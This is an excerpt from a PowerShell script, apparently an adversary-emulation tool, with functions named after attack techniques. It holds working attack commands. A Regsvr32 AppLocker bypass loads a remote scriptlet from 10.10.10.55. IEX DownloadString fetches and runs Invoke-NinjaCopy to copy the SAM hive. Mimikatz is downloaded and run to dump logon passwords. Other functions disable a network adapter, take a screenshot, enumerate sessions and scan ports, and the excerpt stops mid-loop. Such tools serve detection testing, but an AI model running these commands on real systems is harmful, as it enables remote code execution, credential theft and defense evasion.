...
Function sub_ApplockerBypass_Regsvr32() {
    Start-ProcessEx -FileName "Regsvr32.exe" -Arguments "/s /n /u /i:http://10.10.10.55/file.sct scrobj.dll"
}
#endregion
...
Function sub_CommandAndControl_BlacklistedIPAddressesDNS() {
    ...
    #$WebRequest = Invoke-WebRequest -Uri $url -Headers @{ "dnt" = "1"; "accept-encoding" = "gzip, deflate, br"; "accept-language" = "en-US,en;q=0.9"; "upgrade-insecure-requests" = "1"; "user-agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"; "accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"; "referer" = "https://www.ip-finder.me/120.203.25.58/"; "scheme" = "https"; "method" = "GET"} 
    #Write-Host $WebRequest
    $github = 'https://raw.githubusercontent.com/basti1-b/scripts/master/blacklistedip.md'
    $page = Invoke-WebRequest -Uri $github
...
Function sub_CommandAndControl_BlacklistedIPAddresses() {    
    $url = "https://myip.ms/browse/blacklist/1/countryID/BEL"
    Write-LogToConsole "Fetching 10 Blacklisted IP address from [$($url)]"    
    $github = 'https://raw.githubusercontent.com/basti1-b/scripts/master/blacklistedip.md'
    $page = Invoke-WebRequest -Uri $github
    $Links = $page.Links.href
...
Function sub_Collection_ScreenCapture() {
    ...
    Write-LogToConsole "Capturing a screenshot in $FileName in 5 seconds"
    sleep -Seconds 5
...
Function sub_DefenseEvasion_DisableNIC() {
    Disable-NetAdapter "Ethernet0 2" -Confirm:$true
}
...
Function sub_Credentials_CopySamFile() {
    ...
    $url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200502/mimikatz_trunk.zip"
    ...
    #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/basti1-b/scripts/master/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "C:\Users\Administrator\AppData\Local\Temp\x64\lsass.dmp" -verbose
    
    #Start-Sleep 20
    if([Environment]::Is64BitOperatingSystem)  {
        Write-LogToConsole "Windows is 64Bit"
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/basti1-b/scripts/master/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "$Folder\x64\lsass.dmp" -verbose
        Start-Sleep 30
        Start-ProcessEx -FileName "$Folder\x64\mimikatz.exe" -Arguments """privilege::debug"" ""log sekurlsa.log"" ""sekurlsa::minidump lsass.dmp"" ""sekurlsa::logonPasswords"" ""exit"""
    }
    else {
        Write-LogToConsole "Windows is 32Bit"
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/basti1-b/scripts/master/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "$Folder\Win32\lsass.dmp" -verbose
        Start-ProcessEx -FileName "$Folder\Win32\mimikatz.exe" -Arguments """privilege::debug"" ""log sekurlsa.log"" ""sekurlsa::minidump lsass.dmp"" ""sekurlsa::logonPasswords"" ""exit"""
    }
    Start-Sleep 15
...
Function sub_Discovery_SystemNetworkSessionEnum(){
    Start-ProcessEx -FileName "net.exe" -Arguments "session /list"
}
...
Function sub_Discovery_SystemNetworkConnections() {
    ...
    Start-ProcessEx -FileName "netstat.exe" -Arguments "-r"
}
...
Function sub_Discovery_NetworkServiceScanning() {
    ...
    {
        Write-LogToConsole "About to scan ports 1-1024 on $HostName (It may take a few minutes)"
        for ($i = 1; $i -lt 1024; $i++) 
        { 
